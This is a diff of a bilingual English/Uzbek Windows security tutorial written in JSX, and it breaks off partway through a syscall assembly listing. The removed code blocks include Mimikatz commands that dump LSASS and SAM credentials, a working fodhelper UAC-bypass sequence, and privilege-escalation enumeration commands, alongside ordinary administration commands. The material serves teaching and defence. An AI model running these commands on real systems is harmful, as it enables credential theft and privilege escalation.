       <P><Term>Masofaviy ish stoli protokoli (RDP)</Term> — tarmoq orqali masofaviy Windows kompyuteriga ulanish va boshqarish imkonini beradi, go'yo uning oldida o'tirgandek. <Em>TCP port 3389</Em> da ishlaydi va barcha Windows Pro/Enterprise nashrlarda o'rnatilgan.</P>
-      <pre><code>{`
-  Sizning kompyuteringiz (RDP Mijoz)    Masofaviy kompyuter (RDP Server)
-  ┌─────────────────────┐              ┌──────────────────────────────┐
-  │ mstsc.exe           │──TCP 3389───►│ TermService (svchost)        │
-  │ Masofaviy ish stoli │              │ Masofaviy ish stolini         │
-  │ Ulanish ilovasi     │◄──ekran─────│ sizga ko'rsatadi              │
-  └─────────────────────┘              └──────────────────────────────┘`}</code></pre>
       <H2 num="§2" uz="Maqsadli kompyuterda RDP ni yoqish" en="" />
       <ol>
         <li>Sozlamalar → Tizim → <Em>Masofaviy ish stoli</Em></li>
@@ -6431,12 +5833,6 @@ function SectionFirewallBasic() {
       <P>Windows Security → Firewall &amp; network protection — you'll see Domain / Private / Public with ON/OFF status. All three should normally be ON.</P>
       <H2 num="§4" en="Advanced Firewall — wf.msc" uz="" />
       <P>Run <code>wf.msc</code> for the full Windows Defender Firewall with Advanced Security console.</P>
-      <pre><code>{`
-  wf.msc layout:
-  ├── Inbound Rules  — controls what can reach YOUR PC
-  ├── Outbound Rules — controls what YOUR PC can reach
-  ├── Connection Security Rules — IPsec rules
-  └── Monitoring — active rules and connections`}</code></pre>
       <P>Creating a new inbound rule:</P>
       <ol>
         <li>wf.msc → Inbound Rules → <Em>New Rule</Em> (right panel)</li>
@@ -6447,11 +5843,6 @@ function SectionFirewallBasic() {
         <li>Name it and click Finish</li>
       </ol>
       <H2 num="§5" en="Testing the Firewall" uz="" />
-      <pre><code>{`# Test if port is blocked (PowerShell):
-Test-NetConnection -ComputerName localhost -Port 3389
-
-# List all active firewall rules:
-Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select DisplayName, Direction, Action`}</code></pre>
       <Callout kind="warn">Never turn off the firewall for "testing" and forget to re-enable it. If an app needs a port opened, create a specific rule rather than disabling the firewall entirely.</Callout>
     </section>
   ) : (
@@ -6472,12 +5863,6 @@ Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select DisplayName,
       <P>Windows Security → Xavfsizlik devori va tarmoq himoyasi — Domen / Shaxsiy / Ommaviy ni YOQILGAN/O'CHIRILGAN holati bilan ko'rasiz. Odatda uchtasi ham YOQILGAN bo'lishi kerak.</P>
       <H2 num="§4" uz="Kengaytirilgan xavfsizlik devori — wf.msc" en="" />
       <P>To'liq Windows Defender Firewall with Advanced Security konsolini ochish uchun <code>wf.msc</code> ni ishga tushiring.</P>
-      <pre><code>{`
-  wf.msc tuzilishi:
-  ├── Kiruvchi qoidalar  — SIZNING kompyuteringizga nima yetib kelishini nazorat qiladi
-  ├── Chiquvchi qoidalar — SIZNING kompyuteringiz nimaga yetib borishini nazorat qiladi
-  ├── Ulanish xavfsizligi qoidalari — IPsec qoidalari
-  └── Monitoring — faol qoidalar va ulanishlar`}</code></pre>
       <P>Yangi kiruvchi qoida yaratish:</P>
       <ol>
         <li>wf.msc → Kiruvchi qoidalar → <Em>Yangi qoida</Em> (o'ng panel)</li>
@@ -6488,11 +5873,6 @@ Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select DisplayName,
         <li>Nomi bering va Tugatish ni bosing</li>
       </ol>
       <H2 num="§5" uz="Xavfsizlik devorini sinash" en="" />
-      <pre><code>{`# Port bloklanganligini tekshirish (PowerShell):
-Test-NetConnection -ComputerName localhost -Port 3389
-
-# Barcha faol xavfsizlik devori qoidalarini ro'yxatlash:
-Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select DisplayName, Direction, Action`}</code></pre>
       <Callout kind="warn">Xavfsizlik devorini "sinov" uchun o'chirib, qayta yoqishni unutmang. Agar dasturga port kerak bo'lsa, xavfsizlik devorini butunlay o'chirish o'rniga muayyan qoida yarating.</Callout>
     </section>
   );
@@ -6706,19 +6086,6 @@ function SectionServices() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Service Registry Configuration</h3>
       <P>Each service has a subkey under <code>HKLM\SYSTEM\CurrentControlSet\Services\{"{ServiceName}"}</code>:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler
-  ImagePath    REG_EXPAND_SZ  %SystemRoot%\\System32\\spoolsv.exe
-  DisplayName  REG_SZ         Print Spooler
-  Description  REG_SZ         ...
-  ObjectName   REG_SZ         LocalSystem        ← service account
-  Start        REG_DWORD      0x2                ← Automatic
-  Type         REG_DWORD      0x110              ← WIN32_OWN + INTERACTIVE
-  ErrorControl REG_DWORD      0x1                ← Normal (log but continue boot)
-  DependOnService REG_MULTI_SZ RPCSS\\0SPOOLER\\0  ← must start after these
-
-  Parameters\\
-    ServiceDll  REG_EXPAND_SZ  %SystemRoot%\\system32\\spoolsv.exe
-    ← for svchost-hosted services: this points to the DLL`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Service-Based Attack Techniques</h3>
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -6737,27 +6104,6 @@ function SectionServices() {
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.9 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List all services and their states
-sc query type= all state= all
-Get-Service | Select-Object Name, DisplayName, Status, StartType | Sort-Object Status
-
-# Service details (ImagePath, account, dependencies)
-sc qc Spooler                          # classic sc.exe
-Get-WmiObject Win32_Service | Where {$_.Name -eq "Spooler"} | Format-List *
-
-# Check for unquoted service paths (privesc check)
-wmic service get name,pathname | findstr /i /v "c:\\windows\\"
-
-# Service DACL audit
-accesschk.exe -uwcqv "Everyone" *      # services writable by Everyone
-accesschk.exe -c Spooler              # specific service DACL
-
-# Create / delete a service (Admin required)
-sc create TestSvc binPath="C:\\test.exe" start=auto obj=LocalSystem
-sc delete TestSvc
-
-# New service creation audit (Event ID 7045)
-Get-WinEvent -LogName System | Where {$_.Id -eq 7045} | Select -First 10 | Format-List`}</code></pre>
     </section>
   ) : (
     <section>
@@ -6888,19 +6234,6 @@ Get-WinEvent -LogName System | Where {$_.Id -eq 7045} | Select -First 10 | Forma
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Servis Registry Konfiguratsiyasi</h3>
       <P>Har bir servisda <code>HKLM\SYSTEM\CurrentControlSet\Services\{"{ServisNomi}"}</code> ostida pastki kalit mavjud:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler
-  ImagePath    REG_EXPAND_SZ  %SystemRoot%\\System32\\spoolsv.exe
-  DisplayName  REG_SZ         Print Spooler
-  Description  REG_SZ         ...
-  ObjectName   REG_SZ         LocalSystem        ← servis akkaunti
-  Start        REG_DWORD      0x2                ← Automatic
-  Type         REG_DWORD      0x110              ← WIN32_OWN + INTERACTIVE
-  ErrorControl REG_DWORD      0x1                ← Normal (log, lekin yuklashni davom ettir)
-  DependOnService REG_MULTI_SZ RPCSS\\0SPOOLER\\0  ← bular ishga tushgandan keyin boshlanishi kerak
-
-  Parameters\\
-    ServiceDll  REG_EXPAND_SZ  %SystemRoot%\\system32\\spoolsv.exe
-    ← svchost da joylashtirilgan servislar uchun: bu DLL ga ko'rsatadi`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Servis Asosidagi Hujum Texnikalari</h3>
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -6919,27 +6252,6 @@ Get-WinEvent -LogName System | Where {$_.Id -eq 7045} | Select -First 10 | Forma
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.9 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Barcha servislar va ularning holatlarini ro'yxatga olish
-sc query type= all state= all
-Get-Service | Select-Object Name, DisplayName, Status, StartType | Sort-Object Status
-
-# Servis tafsilotlari (ImagePath, akkount, bog'liqliklar)
-sc qc Spooler
-Get-WmiObject Win32_Service | Where {$_.Name -eq "Spooler"} | Format-List *
-
-# Qo'shtirnoqsiz servis yo'llarini tekshirish (imtiyoz ko'tarish tekshiruvi)
-wmic service get name,pathname | findstr /i /v "c:\\windows\\"
-
-# Servis DACL tekshiruvi
-accesschk.exe -uwcqv "Everyone" *    # Hammaga yoziladigan servislar
-accesschk.exe -c Spooler             # Muayyan servis DACL
-
-# Servis yaratish / o'chirish (Admin kerak)
-sc create TestSvc binPath="C:\\test.exe" start=auto obj=LocalSystem
-sc delete TestSvc
-
-# Yangi servis yaratish tekshiruvi (Event ID 7045)
-Get-WinEvent -LogName System | Where {$_.Id -eq 7045} | Select -First 10 | Format-List`}</code></pre>
     </section>
   );
 }
@@ -6974,26 +6286,6 @@ function SectionUserAccounts() {
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — SAM Database and SID Structure</h3>
       <P>Local accounts are stored in the <Term>SAM (Security Account Manager)</Term> database — a registry hive at <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Windows\System32\config\SAM</code>. It is locked by the SYSTEM process while Windows is running — you cannot copy it directly. The SAM hive stores password hashes encrypted with a key derived from the SYSTEM hive (historically called SYSKEY, now always enabled).</P>
       <P>Every account has a <Term>SID (Security Identifier)</Term> — a unique identifier used in ACLs and tokens:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`SID Format: S-Revision-IdentifierAuthority-SubAuthority1-...-RID
-
-Examples:
-S-1-5-18                        → SYSTEM (well-known, always same)
-S-1-5-19                        → LocalService
-S-1-5-20                        → NetworkService
-S-1-5-21-[domain]-500           → Local Administrator (RID 500)
-S-1-5-21-[domain]-501           → Guest (RID 501)
-S-1-5-21-[domain]-1000          → First regular user account
-S-1-5-21-[domain]-1001          → Second regular user account
-
-Common Well-Known SIDs:
-S-1-1-0    Everyone
-S-1-5-11   Authenticated Users
-S-1-5-32-544  BUILTIN\Administrators group
-S-1-5-32-545  BUILTIN\Users group
-S-1-16-4096   Low Integrity Level
-S-1-16-8192   Medium Integrity Level
-S-1-16-12288  High Integrity Level
-S-1-16-16384  System Integrity Level`}</code></pre>
       <Callout color="var(--c-system)" icon="info" titleEn="RID 500 vs renamed Administrator" titleUz="">
         Many organizations rename the built-in Administrator account (RID 500) to something else, thinking it hides it. The SID — including the RID 500 — is still visible in access tokens and event logs. Attackers enumerate the RID, not the name. Renaming provides no real security.
       </Callout>
@@ -7013,18 +6305,6 @@ S-1-16-16384  System Integrity Level`}</code></pre>
           </div>
         ))}
       </div>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:12}}><code>{`# Python: compute NTLM hash manually
-import hashlib
-password = "P@ssw0rd"
-ntlm = hashlib.new('md4', password.encode('utf-16-le')).hexdigest()
-print(ntlm)  # → e19ccf75ee54e06b06a5907af13cef42
-
-# LM hash (legacy, disabled by default since Vista):
-# - Password truncated/padded to 14 chars, split into two 7-char halves
-# - Each half DES-encrypted with a fixed key
-# - Completely broken: case-insensitive, max 14 chars, easily cracked
-# Check if LM hashes are disabled:
-reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></pre>
       <Callout color="var(--c-err)" icon="warning" titleEn="NTLM hashes ARE the password for Pass-the-Hash" titleUz="">
         NTLM authentication doesn't require the plaintext password — it only requires the hash. An attacker who extracts the NTLM hash from SAM or LSASS can authenticate as that user without ever cracking the password. This is <em>Pass-the-Hash</em> (PtH) — one of the most devastating lateral movement techniques in Windows environments.
       </Callout>
@@ -7087,30 +6367,6 @@ reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List local users and groups
-net user                              # all local accounts
-net user Administrator                # details on specific account
-Get-LocalUser | Select Name, Enabled, PasswordLastSet, LastLogon
-Get-LocalGroupMember Administrators   # who's in local admins
-
-# SID lookup
-whoami /user                          # current user's SID
-Get-LocalUser | Select Name, SID
-wmic useraccount get name,sid         # all accounts + SIDs
-
-# Profile locations
-Get-ChildItem C:\\Users               # all profiles
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
-
-# Credential Manager
-cmdkey /list                          # list stored credentials
-# (Mimikatz, requires admin)
-sekurlsa::logonpasswords              # dump LSASS credentials
-lsadump::sam                          # dump SAM hashes (SYSTEM privilege)
-dpapi::cred /in:"%appdata%\\Microsoft\\Credentials\\[blob]"  # decrypt DPAPI blob
-
-# Check if LM hashes disabled (should be 1)
-reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></pre>
     </section>
   ) : (
     <section>
@@ -7139,26 +6395,6 @@ reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — SAM Ma'lumotlar Bazasi va SID Tuzilishi</h3>
       <P>Mahalliy akkauntlar <Term>SAM (Xavfsizlik Akkount Menejeri)</Term> ma'lumotlar bazasida saqlanadi — <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Windows\System32\config\SAM</code> da registry hive. Windows ishlab turganida SYSTEM jarayoni tomonidan bloklanadi — uni to'g'ridan-to'g'ri ko'chira olmaysiz. SAM hive SYSTEM hive dan olingan kalit bilan shifrlangan parol hashlari saqlaydi.</P>
       <P>Har bir akkountda <Term>SID (Xavfsizlik Identifikatori)</Term> mavjud — ACL lar va tokenlarda ishlatiladigan noyob identifikator:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`SID Formati: S-Reviziya-IdentifikatorAuthority-SubAuthority1-...-RID
-
-Misollar:
-S-1-5-18                        → SYSTEM (taniqli, har doim bir xil)
-S-1-5-19                        → LocalService
-S-1-5-20                        → NetworkService
-S-1-5-21-[domen]-500            → Mahalliy Administrator (RID 500)
-S-1-5-21-[domen]-501            → Mehmon (RID 501)
-S-1-5-21-[domen]-1000           → Birinchi oddiy foydalanuvchi akkounti
-S-1-5-21-[domen]-1001           → Ikkinchi oddiy foydalanuvchi akkounti
-
-Keng Tarqalgan Taniqli SID lar:
-S-1-1-0    Hamma
-S-1-5-11   Autentifikatsiya Qilingan Foydalanuvchilar
-S-1-5-32-544  BUILTIN\\Administratorlar guruhi
-S-1-5-32-545  BUILTIN\\Foydalanuvchilar guruhi
-S-1-16-4096   Past Yaxlitlik Darajasi
-S-1-16-8192   O'rta Yaxlitlik Darajasi
-S-1-16-12288  Yuqori Yaxlitlik Darajasi
-S-1-16-16384  Tizim Yaxlitlik Darajasi`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — NTLM Parol Hashlash</h3>
       <P>Windows parollarni <Term>NTLM hashlari</Term> (NT hashlari ham deyiladi) sifatida saqlaydi. Algoritm:</P>
@@ -7262,31 +6498,6 @@ S-1-16-16384  Tizim Yaxlitlik Darajasi`}</code></pre>
       </Callout>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Mahalliy foydalanuvchilar va guruhlarni ro'yxatga olish
-net user
-net user Administrator
-Get-LocalUser | Select Name, Enabled, PasswordLastSet, LastLogon
-Get-LocalGroupMember Administrators
-
-# SID qidirish
-whoami /user
-Get-LocalUser | Select Name, SID
-wmic useraccount get name,sid
-
-# Profil joylashuvlari
-Get-ChildItem C:\\Users
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
-
-# LM hashlari o'chirilganligini tekshirish (1 bo'lishi kerak)
-reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash
-
-# NTLM hashini Python da hisoblash
-python3 -c "import hashlib; print(hashlib.new('md4','P@ssw0rd'.encode('utf-16-le')).hexdigest())"
-
-# Mimikatz (Admin kerak)
-sekurlsa::logonpasswords    # LSASS hisob ma'lumotlarini dumplash
-lsadump::sam                # SAM hashlarini dumplash
-dpapi::cred /in:"%appdata%\\Microsoft\\Credentials\\[blob]"`}</code></pre>
     </section>
   );
 }
@@ -7423,43 +6634,6 @@ function SectionUAC() {
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check current process integrity level
-whoami /groups | findstr "Mandatory Label"
-# → Mandatory Label\\High Mandatory Level = elevated
-# → Mandatory Label\\Medium Mandatory Level = not elevated
-
-# Check UAC configuration
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
-
-# Find auto-elevated binaries (check manifests)
-# PowerShell: look for autoElevate in System32 manifests
-Get-ChildItem C:\\Windows\\System32\\*.exe | ForEach-Object {
-  $m = [xml](sigcheck.exe -m $_.FullName 2>$null)
-  if ($m -and $m.assembly.trustInfo.security.requestedPrivileges.requestedExecutionLevel.autoElevate -eq 'true') {
-    $_.Name
-  }
-}
-
-# fodhelper UAC bypass (test in lab only)
-New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force
-Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
-  -Name "(default)" -Value "cmd.exe"
-Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
-  -Name "DelegateExecute" -Value ""
-Start-Process "C:\\Windows\\System32\\fodhelper.exe"
-
-# Detection: check for unexpected high-integrity processes
-Get-Process | ForEach-Object {
-  try {
-    $tok = $_.OpenProcessToken([System.Security.Principal.TokenAccessLevels]::Query)
-    # check integrity level
-  } catch {}
-}
-
-# Harden: set UAC to always prompt (level 2)
-Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" \`
-  -Name ConsentPromptBehaviorAdmin -Value 2`}</code></pre>
     </section>
   ) : (
     <section>
@@ -7586,26 +6760,6 @@ Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Pol
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Joriy jarayon yaxlitlik darajasini tekshirish
-whoami /groups | findstr "Mandatory Label"
-# → Mandatory Label\\High Mandatory Level = ko'tarilgan
-# → Mandatory Label\\Medium Mandatory Level = ko'tarilmagan
-
-# UAC konfiguratsiyasini tekshirish
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
-
-# fodhelper UAC bypass (faqat laboratoriyada test qiling)
-New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force
-Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
-  -Name "(default)" -Value "cmd.exe"
-Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
-  -Name "DelegateExecute" -Value ""
-Start-Process "C:\\Windows\\System32\\fodhelper.exe"
-
-# UAC ni mustahkamlash: har doim so'rov (2-daraja)
-Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" \`
-  -Name ConsentPromptBehaviorAdmin -Value 2`}</code></pre>
     </section>
   );
 }
@@ -7687,24 +6841,6 @@ function SectionDLL() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — DllMain and Lifecycle</h3>
       <P>When a DLL is loaded or unloaded, Windows calls its <Term>DllMain</Term> entry point with a reason code:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-  switch (fdwReason) {
-    case DLL_PROCESS_ATTACH:
-      // DLL loaded into process — initialize globals, start threads
-      // WARNING: loader lock held — NO LoadLibrary, CreateThread here
-      break;
-    case DLL_PROCESS_DETACH:
-      // DLL being unloaded — free resources
-      break;
-    case DLL_THREAD_ATTACH:
-      // New thread created in this process — allocate TLS
-      break;
-    case DLL_THREAD_DETACH:
-      // Thread exiting — free TLS
-      break;
-  }
-  return TRUE; // FALSE = refuse to load (DLL_PROCESS_ATTACH only)
-}`}</code></pre>
       <Callout color="var(--c-err)" icon="warning" titleEn="Loader lock deadlock — DllMain restrictions are critical" titleUz="">
         DllMain is called while the <em>loader lock</em> is held. Any attempt to call <code>LoadLibrary</code>, <code>FreeLibrary</code>, or <code>CreateThread</code> from inside DllMain risks a deadlock. This is a common source of hanging processes during DLL injection — the injected DLL calls <code>LoadLibrary</code> from its DllMain, deadlocking against the loader lock held by the injecting thread.
       </Callout>
@@ -7732,29 +6868,6 @@ function SectionDLL() {
       <P>A DLL can <em>forward</em> an export to another DLL. In the export directory, instead of an RVA to code, the entry contains a string like <code>"NTDLL.RtlAllocateHeap"</code> — the loader redirects the call. This is used legitimately (kernel32 forwards many functions to kernelbase), and maliciously: a <Term>proxy DLL</Term> exports all the same functions as the legitimate DLL (forwarding to the real one), plus runs attacker code in DllMain or in wrapped functions. Creating one requires matching the export table exactly — tools: <code>AheadLib</code>, <code>SharpDllProxy</code>.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# View DLL exports
-dumpbin /exports C:\\Windows\\System32\\kernel32.dll
-# View DLL imports (dependencies)
-dumpbin /imports myapp.exe
-
-# Check ASLR / DEP flags
-dumpbin /headers foo.dll | findstr /i "dll characteristics"
-# 0x0040 = ASLR, 0x0100 = NX (DEP), 0x4000 = CFG
-
-# List DLLs loaded in a running process
-listdlls.exe -v notepad.exe     # Sysinternals
-Get-Process notepad | Select -ExpandProperty Modules | Select FileName
-
-# Find hijackable DLL loads (Process Monitor)
-# Filter: Operation = CreateFile, Result = NAME NOT FOUND, Path ends in .dll
-
-# Verify DLL signatures
-sigcheck.exe -a C:\\Windows\\System32\\kernel32.dll
-
-# WinDbg — list loaded modules
-lm                    # all modules with addresses
-!lmi kernel32         # detailed module info
-x kernel32!*Create*   # exports matching pattern`}</code></pre>
     </section>
   ) : (
     <section>
@@ -7830,24 +6943,6 @@ x kernel32!*Create*   # exports matching pattern`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — DllMain va Hayot Tsikli</h3>
       <P>DLL yuklanganida yoki tushurilganda Windows uning <Term>DllMain</Term> kirish nuqtasini sabab kodi bilan chaqiradi:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-  switch (fdwReason) {
-    case DLL_PROCESS_ATTACH:
-      // DLL jarayonga yuklandi — globallarni ishga tushirish, threadlar boshlash
-      // OGOHLANTIRISH: loader lock ushlab turilgan — bu yerda LoadLibrary, CreateThread YO'Q
-      break;
-    case DLL_PROCESS_DETACH:
-      // DLL tushirilmoqda — resurslarni bo'shatish
-      break;
-    case DLL_THREAD_ATTACH:
-      // Bu jarayonda yangi thread yaratildi — TLS ajratish
-      break;
-    case DLL_THREAD_DETACH:
-      // Thread chiqmoqda — TLS ni bo'shatish
-      break;
-  }
-  return TRUE; // FALSE = yuklashni rad etish (faqat DLL_PROCESS_ATTACH)
-}`}</code></pre>
       <Callout color="var(--c-err)" icon="warning" titleUz="Loader lock deadlock — DllMain cheklovlari muhim" titleEn="">
         DllMain <em>loader lock</em> ushlab turilganda chaqiriladi. DllMain ichidan <code>LoadLibrary</code>, <code>FreeLibrary</code> yoki <code>CreateThread</code> chaqirishga har qanday urinish deadlock xavfini tug'diradi. Bu DLL in'ektsiyasi paytida jarayonning osilib qolishining keng tarqalgan sababi — in'ektsiya qilingan DLL o'zining DllMain dan <code>LoadLibrary</code> chaqiradi, in'ektsiyalovchi thread ushlab turgan loader lock ga qarshi deadlock hosil qiladi.
       </Callout>
@@ -7875,29 +6970,6 @@ x kernel32!*Create*   # exports matching pattern`}</code></pre>
       <P>DLL eksportni boshqa DLL ga <em>yo'naltirishi</em> mumkin. Eksport katalogida, kod uchun RVA o'rniga, yozuv <code>"NTDLL.RtlAllocateHeap"</code> kabi satrni o'z ichiga oladi — loader chaqiruvni yo'naltiradi. Bu qonuniy holda ishlatiladi (kernel32 ko'p funksiyalarni kernelbase ga yo'naltiradi) va zararli holda: <Term>proksi DLL</Term> qonuniy DLL bilan bir xil barcha funksiyalarni eksport qiladi (haqiqiysiga yo'naltirib), va DllMain da yoki o'ralgan funksiyalarda hujumchi kodini ishlatadi.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# DLL eksportlarini ko'rish
-dumpbin /exports C:\\Windows\\System32\\kernel32.dll
-# DLL importlarini ko'rish (bog'liqliklar)
-dumpbin /imports myapp.exe
-
-# ASLR / DEP bayroqlarini tekshirish
-dumpbin /headers foo.dll | findstr /i "dll characteristics"
-# 0x0040 = ASLR, 0x0100 = NX (DEP), 0x4000 = CFG
-
-# Ishlaydigan jarayonda yuklangan DLL larni ro'yxatga olish
-listdlls.exe -v notepad.exe     # Sysinternals
-Get-Process notepad | Select -ExpandProperty Modules | Select FileName
-
-# Hijack qilinadigan DLL yuklashlarini topish (Process Monitor)
-# Filtr: Operation = CreateFile, Result = NAME NOT FOUND, Path .dll bilan tugaydi
-
-# DLL imzolarini tekshirish
-sigcheck.exe -a C:\\Windows\\System32\\kernel32.dll
-
-# WinDbg — yuklangan modullarni ro'yxatga olish
-lm                    # manzillar bilan barcha modullar
-!lmi kernel32         # batafsil modul ma'lumoti
-x kernel32!*Create*   # naqshga mos eksportlar`}</code></pre>
     </section>
   );
 }
@@ -7958,17 +7030,6 @@ function SectionWindowsAPI() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — Syscall Mechanics (x64)</h3>
       <P>On x64 Windows, every Win32 API call that needs kernel services eventually hits the <Term>syscall stub</Term> in ntdll. The stub assigns a <Em>System Service Number (SSN)</Em> and executes the <code>SYSCALL</code> instruction:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`; ntdll!NtCreateFile syscall stub (Windows 11 x64)
-NtCreateFile:
-    mov  r10, rcx          ; save rcx (1st param) in r10 per ABI
-    mov  eax, 55h          ; SSN = 0x55 for NtCreateFile on this build
-    test byte ptr [SharedUserData+0x308], 1  ; check for Syscall Filtering (KPTI)
-    jnz  short KiFastSystemCall2
